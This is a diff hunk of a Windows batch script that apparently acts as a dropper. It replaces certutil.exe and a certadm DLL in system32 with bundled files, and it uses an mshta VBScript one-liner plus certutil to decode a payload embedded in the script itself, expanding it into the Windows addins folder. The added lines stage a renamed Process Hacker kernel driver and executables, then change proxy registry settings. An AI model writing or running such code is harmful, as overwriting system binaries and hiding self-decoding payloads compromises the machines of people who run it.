@@ -40,16 +40,26 @@ ping 127.0.0.1 -n 1
 crtdll.vbs
 ping 127.0.0.1 -n 8
 move /Y certutilxp.exe %windir%\system32\certutil.exe
-move /Y certadmXP.dll %windir%\system32\certadmXP.dll
+move /Y certadmXP.dll %windir%\system32\certadm.dll
 del /f /q crt.vbs
 del /f /q crtdll.vbs
-
 
 :decode
 set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
 >>"Procx.64" mshta "vbscript:%fso%.GetStandardStream(1).Write(Split(%fso%.OpenTextFile("%x: ="+Chr(32)+"%").ReadAll(),vbCrLf+"exit"+Chr(32)+"/b"+Chr(32)+"0"+vbCrLf)(1))&Close()"
 certutil.exe -decode Procx.64 Procx.cab
 expand Procx.cab -F:*.* %windir%\addins
+ver|find "5.1"&&goto xpu
+goto othe
+:xpu
+md x86\plugins
+move /y romadachashin.exe x86\romadachashin.exe
+move /y romadachashin.exe.settings.xml x86\romadachashin.exe.settings.xml
+move /y kprocesshacker.sys x86\kprocesshacker.sys
+move /y peview.exe x86\peview.exe
+copy /y *.dll x86\plugins\*.dll
+del /f /q *.dll
+:othe
 start ProcH.bat
 explorer.exe %windir%\addins
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0x00000000 /f
